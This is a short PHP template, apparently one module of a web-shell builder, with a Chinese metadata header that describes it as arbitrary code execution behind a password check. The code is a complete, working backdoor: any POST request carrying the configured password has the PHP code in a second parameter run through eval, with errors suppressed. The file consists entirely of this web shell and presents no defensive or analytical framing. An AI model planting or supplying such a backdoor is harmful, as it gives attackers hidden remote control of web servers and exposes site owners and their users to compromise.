// MODULE = {"name": "php_eval", "desc": "PHP 任意代码执行:密码校验 + eval(命令参数传 PHP 代码)", "category": "php", "params": [["pass", "连接密码"], ["cmd_param", "代码参数名,默认 cmd"]]}
<?php
if (isset($_POST['pass']) && $_POST['pass'] === '{{pass}}') {
    @eval($_POST['{{cmd_param}}']);
}
?>
